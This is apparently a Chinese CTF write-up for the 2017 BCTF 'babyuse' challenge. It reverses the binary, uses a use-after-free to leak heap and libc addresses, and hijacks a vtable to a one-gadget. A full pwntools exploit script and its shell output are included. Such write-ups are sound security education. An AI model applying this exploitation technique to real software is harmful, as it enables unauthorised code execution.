---
title: 2017 BCTF babyuse
date: 2017-06-16 19:46:08
tags:
- ctf
- use-after-free
categories:
- ctf_practice
---

这题真的小看了，想用一般的套路来泄露libc的地址，居然发现read_name那个函数真的是妖怪函数。
逆向出的结构体：
```c
struct gun
{
    void *vtable;
    char *name;
    int saved_times;
    int left_shoot_times;
}
```
<!-- more -->
```c
int __cdecl read_name(int fd, int a2, int a3, int line_0a)
{
  int i; // [sp+1Ch] [bp-Ch]@1

  for ( i = 0; a3 - 1 > i; ++i )
  {
    if ( read(fd, (void *)(i + a2), 1u) <= 0 )
      return -1;
    if ( *(_BYTE *)(i + a2) == (_BYTE)line_0a )
      break;
  }
  *(_BYTE *)(i + a2) = 0;
  return i;
}
```
要么读a3个字节的数据，要么读到换行符，后面还来个\x00截断，真的是烦，这是最气的。这个方法泄露不了libc，只能另寻出路了。
突然发现在use函数中还有一个妖怪的输出：
```c
v3 = gunp_table[select_gun];
printf("Select gun %s\n", *(_DWORD *)(v3 + 4));
```
可以泄露libc和heap了，很稳~
泄露以后直接把vtable的地址换到heap上并且把vtable中的地址换成onegadget的地址，可以，这是最骚de~~

```python
#!/usr/bin python
from pwn import *

debug = 1

if debug:
	p = process('./babyuse')
	libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
	pass

def buygun(length, name):
	p.recvuntil("Exit\n")
	p.sendline("1")
	p.recvuntil("QBZ95\n")
	p.sendline("1")
	p.recvline()
	p.sendline(str(length))
	p.recvline()
	p.sendline(name)

def selectgun(index):
	p.recvuntil("Exit\n")
	p.sendline("2")
	p.recvline()
	p.sendline(str(index))

def listgun():
	p.recvuntil("Exit\n")
	p.sendline("3")
	p.recvline()

def renamegun(index, length, name):
	p.recvuntil("Exit\n")
	p.sendline("4")
	p.recvline()
	p.sendline(str(index))
	p.recvline()
	p.sendline(str(length))
	p.recvline()
	p.sendline(name)

def usegun():
	p.recvuntil("Exit\n")
	p.sendline("5")

def dropgun(index):
	p.recvuntil("Exit\n")
	p.sendline("6")
	p.recvline()
	p.sendline(str(index))

buygun(0x80, 'a') #0
buygun(0x80, 'a') #1
buygun(0x80, 'a') #2
buygun(0x80, 'a') #3

dropgun(2)
dropgun(0)
usegun()

p.recvuntil("Select gun ")
heap_addr = u32(p.recv(4)) - 0xe8 - 0x70
print "heap_addr: " + hex(heap_addr)
libc_addr = u32(p.recv(4)) - 0x1ac450
print "libc_addr: " + hex(libc_addr)
system_addr = libc_addr + libc.symbols['system']
onegadget = libc_addr + 0x401b3
print "onegadget: " + hex(onegadget)

p.recvuntil("Main menu\n")
p.sendline("4")

payload = p32(heap_addr + 0x148)
renamegun(1, 16, payload)
renamegun(3, 16, p32(onegadget) * 4)

#gdb.attach(p)
usegun()
p.recvuntil("Main menu\n")
p.sendline("1")
p.interactive()
```
可以，很骚。
```shell
w0lfzhang@w0lfzhang666:~/Desktop/ctfs/bctf$ python babyuse.py 
[+] Starting local process './babyuse': pid 5979
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_addr: 0xf8397000
libc_addr: 0xf749f000
onegadget: 0xf74df1b3
[*] Switching to interactive mode
$ id
uid=1000(w0lfzhang) gid=1000(w0lfzhang) groups=1000(w0lfzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```
这题挺简单的，只不过是平时做做题维持一下做题的感觉。开始用gdb-peda查看heap的时候脑袋疼...尤其是32位的系统，看64位的还好。所以就这题的时候换成了pwn-gdb了，用着还好。
